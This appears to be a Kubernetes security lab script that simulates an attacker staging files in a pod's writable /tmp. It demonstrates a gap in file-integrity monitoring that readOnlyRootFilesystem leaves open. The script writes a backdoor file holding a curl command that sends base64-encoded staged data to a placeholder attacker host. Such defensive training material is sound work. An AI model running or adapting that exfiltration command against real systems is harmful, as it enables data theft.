#!/usr/bin/env bash
#
# CSF: RESPOND / RS.MI-02 — Incidents are eradicated
# CIS v8: 3.14 — Log Sensitive Data Access
# NIST 800-53: SI-7 — Software, Firmware, and Information Integrity
#
# L7-10 RS.MI-02 — Break: Plant attacker artifacts in /tmp
#
# SCENARIO: An attacker has gained a shell in the Portfolio API container.
# readOnlyRootFilesystem=true blocks writes to /app — the application tree
# is protected. But /tmp is a writable emptyDir mount. The attacker uses it
# as a staging ground to drop tools and prepare data for exfiltration.
#
# KEY TEACHING POINT: readOnlyRootFilesystem protects /app. It does not
# protect /tmp. FIM on writable paths is the missing detect layer.
#
# This script simulates attacker behavior post-shell-access.
# No actual exfiltration occurs — this is a lab simulation.
#
# Usage: bash break.sh
# Expected: Files written to /tmp with no Falco alert (the gap)

set -euo pipefail

NAMESPACE="anthra"
LABEL_SELECTOR="app.kubernetes.io/component=api"

echo "=== L7-10 RS.MI-02 Break: Planting attacker artifacts in /tmp ==="
echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "Simulating: post-shell-access attacker staging behavior"
echo ""

# ── Locate the API pod ───────────────────────────────────────────────────────

API_POD=$(kubectl get pods -n "${NAMESPACE}" \
  -l "${LABEL_SELECTOR}" \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)

if [[ -z "${API_POD}" ]]; then
  echo "ERROR: No running API pod found in namespace '${NAMESPACE}'"
  echo "       Check: kubectl get pods -n ${NAMESPACE}"
  exit 1
fi

echo "API pod: ${API_POD}"
echo ""

# ── Verify readOnlyRootFilesystem is set (confirm the protect layer exists) ──

echo "--- Confirming readOnlyRootFilesystem is active ---"
ROFS=$(kubectl get pod "${API_POD}" -n "${NAMESPACE}" \
  -o jsonpath='{.spec.containers[0].securityContext.readOnlyRootFilesystem}' \
  2>/dev/null || echo "unknown")
echo "readOnlyRootFilesystem: ${ROFS}"

if [[ "${ROFS}" != "true" ]]; then
  echo "NOTE: readOnlyRootFilesystem is not set to true on this pod."
  echo "      The scenario still demonstrates the /tmp FIM gap, but the"
  echo "      teaching point about root filesystem protection is reduced."
fi
echo ""

# ── Attempt to write to the root filesystem (should fail) ───────────────────

echo "--- Attempting write to /app (expect: permission denied) ---"
kubectl exec -n "${NAMESPACE}" "${API_POD}" -- \
  /bin/sh -c "echo 'test' > /app/injected.py 2>&1 || echo 'BLOCKED: /app is read-only (readOnlyRootFilesystem working)'"
echo ""

# ── Write attacker artifacts to /tmp (should succeed — the gap) ─────────────

echo "--- Writing attacker artifacts to /tmp (expect: success, no Falco alert) ---"
kubectl exec -n "${NAMESPACE}" "${API_POD}" -- /bin/sh -c "
    echo '#!/bin/sh' > /tmp/backdoor.sh
    echo 'curl -s http://attacker.example.com/exfil?data=\$(cat /tmp/*.txt | base64)' >> /tmp/backdoor.sh
    chmod +x /tmp/backdoor.sh
    echo 'sensitive-data-from-rag-pipeline' > /tmp/staged-data.txt
    echo 'Files planted in /tmp — no FIM will catch this'
"

echo ""
echo "--- Confirming artifact presence ---"
kubectl exec -n "${NAMESPACE}" "${API_POD}" -- ls -la /tmp/

echo ""
echo "--- Reading planted artifacts ---"
echo "backdoor.sh contents:"
kubectl exec -n "${NAMESPACE}" "${API_POD}" -- cat /tmp/backdoor.sh

echo ""
echo "staged-data.txt contents:"
kubectl exec -n "${NAMESPACE}" "${API_POD}" -- cat /tmp/staged-data.txt

echo ""
echo "=== Break complete ==="
echo ""
echo "--- What just happened ---"
echo ""
echo "  /app write:  BLOCKED (readOnlyRootFilesystem=true — PREVENT layer working)"
echo "  /tmp write:  SUCCEEDED (emptyDir is writable — DETECT layer missing)"
echo ""
echo "  An attacker with shell access can:"
echo "    - Drop tools and scripts in /tmp"
echo "    - Stage sensitive data for exfiltration"
echo "    - Execute from /tmp if allowed by the container runtime"
echo "    - Do all of this with ZERO Falco alerts using default rules"
echo ""
echo "  This is the FIM gap. readOnlyRootFilesystem is not enough."
echo "  You need both PREVENT (/app protected) AND DETECT (/tmp monitored)."
echo ""
echo "NEXT STEP: Follow detect.md to practice finding this gap from the analyst perspective"
